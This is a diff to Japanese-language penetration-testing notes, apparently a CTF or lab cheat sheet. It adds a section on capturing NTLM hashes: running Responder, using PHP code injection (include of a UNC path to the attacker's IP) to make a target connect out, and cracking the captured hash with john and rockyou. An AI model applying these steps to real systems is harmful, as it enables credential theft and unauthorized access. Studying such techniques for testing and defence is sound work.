@@ -13,3 +13,17 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 Kali Linuxであれば/user/share/wordlistsにrockyouの圧縮されたファイルがある。
 
+## NTLMハッシュの取得
+
+### Responder
+```
+responder -I tun0
+```
+Responderを使用することで様々な通信を受けることができる
+
+### 攻撃対象からResponderへの通信を発生させる
+responderを起動した後、攻撃対象のWebアプリケーション等に対して外部のファイルを取得するように動かす
+```
+例：PHPでinclude(//<受けのIPアドレス>/somefile)を実行されるようCodeInjectionを行うなど
+```
+取得できたハッシュをjohnなどで解析する
